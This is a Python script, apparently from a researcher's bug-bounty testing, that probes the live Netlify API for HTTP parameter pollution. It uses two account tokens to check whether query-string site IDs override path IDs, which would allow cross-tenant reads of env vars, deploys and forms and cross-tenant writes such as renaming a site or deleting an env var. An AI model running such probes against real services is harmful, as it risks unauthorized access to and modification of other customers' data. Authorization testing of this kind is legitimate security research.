# -*- coding: utf-8 -*-
"""HPP 矩阵: /sites/{id}/xxx 端点加 ?site_id=/site_slug=/account_id= query 覆盖测试
思路: env API 风格是 query 传 site_id; 若其它旧端点也读 query 覆盖 path, 则可跨资源"""
import http.client, ssl, gzip, brotli, json, sys, time
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import TOKEN_A, TOKEN_B

ctx = ssl.create_default_context()
SITE_A = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
SITE_B = 'd2977de0-d24d-4544-81cb-933e610cad7d'
FAKE = '00f00000-0000-4000-8000-000000000000'
ACC_A = '6a979dd2ae93f47d55b62897'
ACC_B = '6a97b6454fef0db964f75db6'

def req(method, path, body=None, token=TOKEN_A, timeout=25):
    conn = http.client.HTTPSConnection('api.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json'}
    if token: h['Authorization'] = 'Bearer ' + token
    b = json.dumps(body).encode() if body is not None else None
    conn.request(method, path, body=b, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br': raw = brotli.decompress(raw)
    elif enc == 'gzip': raw = gzip.decompress(raw)
    st = r.status
    txt = raw.decode('utf-8', 'ignore')
    conn.close()
    return st, txt

def probe(tag, m, p, body=None, tok=TOKEN_A):
    st, b = req(m, p, body, tok)
    print('%-66s %s | %s' % (tag, st, b[:150].replace('\n', ' ')))
    return st, b

# A 的 token + 路径上写 B 的 site / 假 site, query 覆盖成 A 的 site
print('== A token: path=B-site + query=site_id=A ==')
paths = [
    ('GET', '/api/v1/sites/%s/env' % SITE_B, '?site_id=%s' % SITE_A),
    ('GET', '/api/v1/sites/%s/env' % SITE_B, '?site_slug=1643584176'),
    ('GET', '/api/v1/sites/%s/database' % SITE_B, '?site_id=%s' % SITE_A),
    ('GET', '/api/v1/sites/%s/deploys' % SITE_B, '?site_id=%s' % SITE_A),
    ('GET', '/api/v1/sites/%s/submissions' % SITE_B, '?site_id=%s' % SITE_A),
    ('GET', '/api/v1/sites/%s/snippets' % SITE_B, '?site_id=%s' % SITE_A),
    ('GET', '/api/v1/sites/%s/build_hooks' % SITE_B, '?site_id=%s' % SITE_A),
    ('GET', '/api/v1/sites/%s/forms' % SITE_B, '?site_id=%s' % SITE_A),
    ('GET', '/api/v1/sites/%s/functions' % SITE_B, '?site_id=%s' % SITE_A),
    ('GET', '/api/v1/sites/%s/ssl' % SITE_B, '?site_id=%s' % SITE_A),
    ('GET', '/api/v1/sites/%s/traffic_splits' % SITE_B, '?site_id=%s' % SITE_A),
    ('GET', '/api/v1/sites/%s' % SITE_B, '?site_id=%s' % SITE_A),
]
for m, p, q in paths:
    probe('%s%s' % (p.split('/api/v1')[1], q), m, p + q)

print()
print('== A token: path=A-site + query=site_id=B(读 B 资源?) ==')
paths2 = [
    ('GET', '/api/v1/sites/%s/env' % SITE_A, '?site_id=%s' % SITE_B),
    ('GET', '/api/v1/sites/%s/database' % SITE_A, '?site_id=%s' % SITE_B),
    ('GET', '/api/v1/sites/%s/deploys' % SITE_A, '?site_id=%s' % SITE_B),
]
for m, p, q in paths2:
    probe('%s%s' % (p.split('/api/v1')[1], q), m, p + q)

print()
print('== 写操作: path=A-site + query 指向 B(若成功=B 被改) ==')
probe('PATCH sites/A?site_id=B name', 'PATCH', '/api/v1/sites/%s?site_id=%s' % (SITE_A, SITE_B),
      {'name': 'zz-hpp-rename-%d' % int(time.time())})
probe('DELETE sites/A/env/ZZ_HPP?site_id=B', 'DELETE',
      '/api/v1/sites/%s/env/ZZ_HPP?site_id=%s' % (SITE_A, SITE_B))
probe('A GET 确认 env 未动(对照)', 'GET', '/api/v1/sites/%s/env' % SITE_A)
print('done')
